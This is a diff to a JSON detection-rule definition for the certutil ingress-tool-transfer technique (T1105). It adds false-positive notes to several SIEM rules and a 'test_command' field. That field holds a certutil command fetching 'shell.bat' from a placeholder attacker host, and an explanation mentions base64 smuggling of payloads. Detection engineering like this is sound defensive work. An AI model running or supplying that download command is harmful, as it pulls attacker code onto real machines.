@@ -96,7 +96,8 @@
           "T1105"
         ],
         "fidelity": "signature",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "IT admin tools, endpoint management agents, or security scanners performing similar actions"
       },
       {
         "platform": "splunk",
@@ -110,7 +111,8 @@
         "confidence": "medium",
         "log_ids": [
           "1"
-        ]
+        ],
+        "false_positives": "Admin scripts, management agents, or IT tools launching similar processes"
       },
       {
         "platform": "splunk",
@@ -124,7 +126,8 @@
         "confidence": "medium",
         "log_ids": [
           "3"
-        ]
+        ],
+        "false_positives": "Admin scripts, management agents, or IT tools launching similar processes"
       },
       {
         "platform": "sigma",
@@ -135,7 +138,8 @@
           "T1105"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate system tools performing similar operations (e.g. admin scripts, management agents)"
       },
       {
         "platform": "elastic",
@@ -145,7 +149,9 @@
         "attack": [
           "T1105"
         ],
-        "fidelity": "signature"
+        "fidelity": "signature",
+        "false_positives": "Legitimate admin tools or management agents performing similar endpoint operations",
+        "confidence": "high"
       }
     ],
     "visibility": {
@@ -181,7 +187,8 @@
         "Review Microsoft Defender for Endpoint, Sysmon for surrounding context (5 min before/after)",
         "Verify whether the activity matches known administrative baselines or change windows",
         "If confirmed malicious, isolate the host and escalate to incident response"
-      ]
+      ],
+      "test_command": "certutil.exe -urlcache -split -f http://<lhost>:8080/shell.bat shell.bat"
     }
   },
   "explain": "Uses the certutil LOLBAS to download a payload over HTTP:\n  certutil.exe -urlcache   use the URL cache download function\n  -split                   split/handle the cached file\n  -f                       force overwrite of any cached copy\n  http://<lhost>:8080/shell.bat shell.bat   the source URL and local output name\nA living-off-the-land way to fetch tools past filters; certutil can also base64 encode/decode to smuggle payloads."
